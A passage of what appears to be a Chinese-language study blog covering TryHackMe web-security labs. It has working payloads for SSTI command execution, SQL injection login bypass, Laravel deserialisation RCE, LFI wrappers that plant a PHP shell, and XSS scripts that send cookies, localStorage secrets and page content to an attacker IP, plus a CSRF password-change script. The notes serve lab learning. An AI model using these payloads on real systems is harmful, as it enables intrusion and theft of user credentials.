#abb2bf">{{&quot;&quot;.__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(&quot;__builtins__&quot;).get(&quot;__import__&quot;)(&quot;subprocess&quot;).check_output([&quot;cat&quot;,&quot;5d8bea6df83cbb6767a235c4ba54933b.txt&quot;])}}</span></span></code></pre></div></div></figure><h2 id="自动化利用工具"><a href="#自动化利用工具" class="headerlink" title="自动化利用工具"></a>自动化利用工具</h2><p><a href="https://github.com/vladko312/SSTImap">SSTImap</a></p><h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><p>题目给了一个 Form Tools 的靶场，在网上搜了一下发现有洞，一个是 <a href="https://github.com/DeepMountains/Mirage/blob/main/CVE2-3.md">SSRF</a>，在创建模板的页面里面有一个智能爬取功能，会执行 curl，还有一个是 <a href="https://vuldb.com/?submit.372318">SSTI</a>，给的提示说是改 <code>Page Theme</code> 不过我改的 <code>Page Titles</code> 能起作用，不过每次都要重新登录一下账号才能起作用，最后还是拿到 flag。</p><h1 id="LDAP-注入"><a href="#LDAP-注入" class="headerlink" title="LDAP 注入"></a>LDAP 注入</h1><p>这个 LDAP 和 AD 强关联</p><p>LDAP 搜索语法</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">(base DN) (scope) (filter) (attributes)</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">ldapsearch -x -H ldap://10.10.55.42:389 -b &quot;dc=ldap,dc=thm&quot; &quot;(ou=People)&quot;</span></span></code></pre></div></div></figure><p>其实也是一个通配符引起的注入，一个 <code>*</code> 干全部。</p><h1 id="Injects"><a href="#Injects" class="headerlink" title="Injects"></a>Injects</h1><p>用下面这个语句登录进了普通管理页面，没啥用，看了一下别人的 wp 是用 SQL 注入字典跑出来的，我也整理了一份。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%27%09||%091=1%09--%09</span></span></code></pre></div></div></figure><p>SSTI 利用则参考：<a href="https://www.freebuf.com/articles/web/314028.html">https://www.freebuf.com/articles/web/314028.html</a></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">{{[&quot;cat ./flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt&quot;, 0]|sort(&quot;passthru&quot;)}}</span></span></code></pre></div></div></figure><h1 id="Insecure-Deserialisation"><a href="#Insecure-Deserialisation" class="headerlink" title="Insecure Deserialisation"></a>Insecure Deserialisation</h1><p>终于讲到反序列化了</p><h2 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h2><h3 id="能访问到源码"><a href="#能访问到源码" class="headerlink" title="能访问到源码"></a>能访问到源码</h3><p>观察 <code>serialize()</code>, <code>unserialize()</code>, <code>pickle.loads()</code> 和其他的方法</p><h3 id="不能访问到源码"><a href="#不能访问到源码" class="headerlink" title="不能访问到源码"></a>不能访问到源码</h3><p>也就是黑盒测试，试着加 ~ 在文件末尾，这可能会访问到之前因为编辑留下来的备份文件什么的。或者 <code>.bak</code> 之类的试试。</p><h4 id="分析服务器响应"><a href="#分析服务器响应" class="headerlink" title="分析服务器响应"></a>分析服务器响应</h4><ul><li>可能会抛出相关方法的错误消息</li><li>修改 POST 和 Cookie ，观察程序的反应，可能会有洞</li></ul><h4 id="检查-Cookie"><a href="#检查-Cookie" class="headerlink" title="检查 Cookie"></a>检查 Cookie</h4><p>Cookie 可能包含一些反序列化的数据</p><ul><li>base64 编码的 cookie：PHP 和 NET</li><li>ASP：__VIEWSTATE</li></ul><h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><h3 id="PHPGGC"><a href="#PHPGGC" class="headerlink" title="PHPGGC"></a>PHPGGC</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">php</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">phpggc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 payload</span></span><span class="line"><span style="color: #61AFEF">php</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">phpggc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Laravel</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 生成 payload</span></span><span class="line"><span style="color: #61AFEF">php</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">phpggc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Laravel/RCE3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">system</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">whoami</span></span></code></pre></div></div></figure><p>通过 Payload + APP_KEY 生成可利用的 payload，这里 THM 有一个网页帮我们实现这一点</p><p><a href="http://10.10.82.141:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=">http://10.10.82.141:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&amp;payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D</a></p><p>执行 payload</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># whoami</span></span><span class="line"><span style="color: #61AFEF">curl</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.10</span><span style="color: #98C379">.82.141:8089</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-X</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">POST</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ==&#39;</span><span style="color: #ABB2BF">| </span><span style="color: #61AFEF">head</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-n</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># uname -r</span></span><span class="line"><span style="color: #61AFEF">curl</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.10</span><span style="color: #98C379">.82.141:8089</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-X</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">POST</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;X-XSRF-TOKEN: eyJpdiI6Ikx4REd5Um5jY0xqa0JYWmlNVnlSRGc9PSIsInZhbHVlIjoiSHRONWhPXC9VK29rY2YrcjFBY2JkblRVM3ZHM1FHcWN4MUZpY0NITmh0cTdrZEE2bytFajdnUm0xVThPYTd4VXRZZ2NNd29jRVhRNmpoZUsxNEdrV05FVmU2eUpkUHJBdDZrVlNITXF3UVptMlpWaVBCWEoyeEV4bjMxMjQzMWdMemk2V1U1ZU5DSFRBdFwvdHBSb0lLdDlUS1dIXC9qK0ZnUUc2R0I1c3ZPbHFyYWMxR0d3VDBPSGlGTXYydmVDOXFzTkxQS0tcL0FBOGljWks0cXVHcWpETHYrS3FDSXp3M1l1Vm9wWDA3VVU0a05sM2VTNm5NbW1WcDdGeDBzR29WN0g5clZvUThRNFd6T0F2ek1ZN09ac1wvamdGcEV3RitEK3lnYTA4c2FHazZHdlB0SVhBb2prXC9NV0FNSWNYV2NWU3MiLCJtYWMiOiJjOTgyZjgzYmQwZWZkZmJkY2JiYjkyZWJhZDNjN2IwODk2NGZjNmVhODMzYmM2NzdjZTViN2UwNDI1ZWIxMzMzIn0=&#39;</span><span style="color: #ABB2BF">| </span><span style="color: #61AFEF">head</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-n</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span></span></code></pre></div></div></figure><h3 id="Java-反序列化利用工具"><a href="#Java-反序列化利用工具" class="headerlink" title="Java 反序列化利用工具"></a>Java 反序列化利用工具</h3><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>我觉得他说的有意义的一点就是可以用 SSRF 去 DDOS，这也是一种反射式攻击了，其他的倒没说什么。</p><h2 id="补救措施"><a href="#补救措施" class="headerlink" title="补救措施"></a>补救措施</h2><p>输入强校验</p><p>白名单</p><p>网络隔离</p><p>实行强访问控制</p><p>全面日志监控</p><h1 id="File-Inclusion-Path-Traversal"><a href="#File-Inclusion-Path-Traversal" class="headerlink" title="File Inclusion, Path Traversal"></a>File Inclusion, Path Traversal</h1><p>LFI 可以用</p><h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">php://filter/convert.base64-encode/resource=/etc/passwd</span></span></code></pre></div></div></figure><h3 id="Data-Wrapper"><a href="#Data-Wrapper" class="headerlink" title="Data Wrapper"></a>Data Wrapper</h3><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">data:text/plain,&lt;?php%20phpinfo();%20?&gt;</span></span></code></pre></div></div></figure><h2 id="LFI2CE-Session-Files"><a href="#LFI2CE-Session-Files" class="headerlink" title="LFI2CE - Session Files"></a>LFI2CE - Session Files</h2><p>session 投毒，想办法往 session 里面写东西，然后用 LFI 去访问那个文件</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydscyddKTtlY2hvICdTaGVsbCBkb25lICEnOyA/Pj4=</span></span></code></pre></div></div></figure><h1 id="Prototype-Pollution"><a href="#Prototype-Pollution" class="headerlink" title="Prototype Pollution"></a>Prototype Pollution</h1><p>这个房间讲了一下原型链污染，主要还是这种 OOP 语言有继承的特性，而 JS 子类的方法全是在一个链上的，他的子类有他链上的所有方法。</p><p>用 <code>__proto__</code> 可以访问到一个对象的原型。</p><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">{</span><span style="color: #98C379">&quot;__proto__&quot;</span><span style="color: #ABB2BF">: {</span><span style="color: #98C379">&quot;toLocaleString&quot;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&quot;Just crash the server&quot;</span><span style="color: #ABB2BF">}}</span></span></code></pre></div></div></figure><h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>这个房间用了原型链调用，SSRF，LFI 加日志污染，日志污染没有实操过，我自己的思路是对的，但是卡在那里了，看了一下 writeup 秒解</p><p><a href="https://medium.com/@z0diac/include-ctf-tryhackme-writeup-c36bded6d2f4">https://medium.com/@z0diac/include-ctf-tryhackme-writeup-c36bded6d2f4</a></p><p>DOM XSS</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;nonexistent.jpg&quot; onerror=&quot;fetch(&#39;http://10.14.106.192/?secret=&#39; + localStorage.getItem(&#39;secret&#39;));&quot;&gt;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data=&#39;+encodeURIComponent(document.documentElement.outerHTML));&quot;&gt;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;nonexistent.jpg&quot; onerror=&quot;this.onerror=null; setTimeout(() =&gt; { fetch(&#39;http://10.14.106.192/?secret=&#39; + localStorage.getItem(&#39;secret&#39;)); }, 6000);&quot;&gt;</span></span></code></pre></div></div></figure><h1 id="CORS-SOP"><a href="#CORS-SOP" class="headerlink" title="CORS &amp; SOP"></a>CORS &amp; SOP</h1><p>这个房间就讲 CORS 和同源策略了</p><p>SOP 以下几点要注意</p><ul><li>即便是同一个域名，不同端口，也是会被影响的，就不用说 HTTP 和 HTTPS 了。</li><li><del>SOP 不仅仅只应用于脚本上，他应用在网页上所有的东西，也就是有 URL 引入，要调用的东西（有歧义，待完善）</del></li><li>SOP 并不是阻止了所有的跨站通信，CORS 就是用来解决这点的</li></ul><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>服务器不会阻拦请求，而是浏览器通过服务器发来的 CORS header 处理这条请求，实际上是浏览器这边作的处理。</p><h3 id="CORS-中不同的-HTTP-头"><a href="#CORS-中不同的-HTTP-头" class="headerlink" title="CORS 中不同的 HTTP 头"></a>CORS 中不同的 HTTP 头</h3><ol><li><strong>Access-Control-Allow-Origin</strong>: This header specifies which domains are allowed to access the resources. For example, <code>Access-Control-Allow-Origin: example.com</code> allows only requests from <code>example.com</code>.</li><li><strong>Access-Control-Allow-Methods</strong>: Specifies the HTTP methods (GET, POST, etc.) that can be used during the request.</li><li><strong>Access-Control-Allow-Headers</strong>: Indicates which HTTP headers can be used during the actual request.</li><li><strong>Access-Control-Max-Age</strong>: Defines how long the results of a preflight request can be cached.</li><li><strong>Access-Control-Allow-Credentials</strong>: This header instructs the browser whether to expose the response to the frontend JavaScript code when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request. If Access-Control-Allow-Credentials is set to true, it allows the browser to access the response from the server when credentials are included in the request. It’s important to note that when this header is used, Access-Control-Allow-Origin cannot be set to * and must specify an explicit domain to maintain security.</li></ol><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 偷 Cookie XSS</span></span><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data1=&#39;+encodeURIComponent(document.cookie));&quot;&gt;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"># 偷页面内容 XSS</span></span><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data1=&#39;+encodeURIComponent(document.documentElement.outerHTML));&quot;&gt;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; window.location.href=&#39;http://10.14.106.192:81/index.html&#39;;&quot;&gt;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">&lt;script&gt;</span></span><span class="line"><span style="color: #abb2bf">  window.location.href=&#39;http://10.14.106.192:81/&#39;;</span></span><span class="line"><span style="color: #abb2bf">&lt;/script&gt;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">&lt;iframe style=&quot;display:none;&quot; src=&quot;http://10.14.106.192:81/&quot;&gt;&lt;/iframe&gt;</span></span></code></pre></div></div></figure><p>XSS + CSRF</p><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  // 1. 定义你要发送的 POST 请求的目标 URL</span></span><span class="line"><span style="color: #ABB2BF">  const targetUrl = &#39;http://target.com/change_password.php&#39;; // 替换为实际目标 URL</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  // 2. 定义 POST 请求要发送的数据（JSON 格式）</span></span><span class="line"><span style="color: #ABB2BF">  const postData = </span><span style="color: #C678DD">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;attacker_controlled_name&#39;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">email</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;attacker@example.com&#39;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">// ... 其他你想修改的字段</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  // 3. 使用 fetch API 发送 POST 请求</span></span><span class="line"><span style="color: #ABB2BF">  fetch(targetUrl, </span><span style="color: #C678DD">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">method</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;POST&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #7F848E; font-style: italic">// 指定为 POST 请求</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">headers</span><span style="color: #ABB2BF">: {</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #98C379">&#39;Content-Type&#39;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;application/json&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #7F848E; font-style: italic">// 设置 Content-Type，通常是 JSON</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #7F848E; font-style: italic">// 可以添加其他需要的头部，例如 Authorization header 如果需要</span></span><span class="line"><span style="color: #ABB2BF">    },</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">JSON</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">stringify</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">postData</span><span style="color: #ABB2BF">), </span><span style="color: #7F848E; font-style: italic">// 将 JavaScript 对象转换为 JSON 字符串作为请求体</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">credentials</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;include&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">// **关键：确保浏览器自动携带目标域的 Cookie**</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  .then(response =&gt; </span><span style="color: #C678DD">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">// 4. 请求成功后，如果服务器响应 CORS 头允许，可以读取响应</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">//    这里的 XSS 使得你处于同源上下文，所以通常可以读取响应</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ok</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">      return response.json(); </span><span style="color: #7F848E; font-style: italic">// 如果响应是 JSON</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">throw</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Network response was not ok.&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  .then(data =&gt; </span><span style="color: #C678DD">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">log</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Profile update response:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">data</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">// 5. 如果你想将响应数据回传到你的服务器，可以再次发起一个请求</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">fetch</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;http://10.14.106.192/log_data.php&#39;</span><span style="color: #ABB2BF">, {</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E06C75">method</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;POST&#39;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E06C75">headers</span><span style="color: #ABB2BF">: { </span><span style="color: #98C379">&#39;Content-Type&#39;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;application/json&#39;</span><span style="color: #ABB2BF"> },</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">JSON</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">stringify</span><span style="color: #ABB2BF">({</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">stolen_response</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">data</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">victim_url</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">window</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">location</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">href</span></span><span class="line"><span style="color: #ABB2BF">      })</span></span><span class="line"><span style="color: #ABB2BF">    });</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  .catch(error =&gt; </span><span style="color: #C678DD">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;There was a problem with the fetch operation:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">error</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">targetUrl</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;http://worldwap.thm:8081/change_password.php&#39;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">postBody</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;new_password=hacked123&#39;</span><span style="color: #ABB2BF">; </span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">fetch</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">targetUrl</span><span style="color: #ABB2BF">, {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">method</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;POST&#39;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">headers</span><span style="color: #ABB2BF">: {</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #98C379">&#39;Content-Type&#39;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;application/x-www-form-urlencoded&#39;</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #ABB2BF">    },</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">postBody</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #ABB2BF">  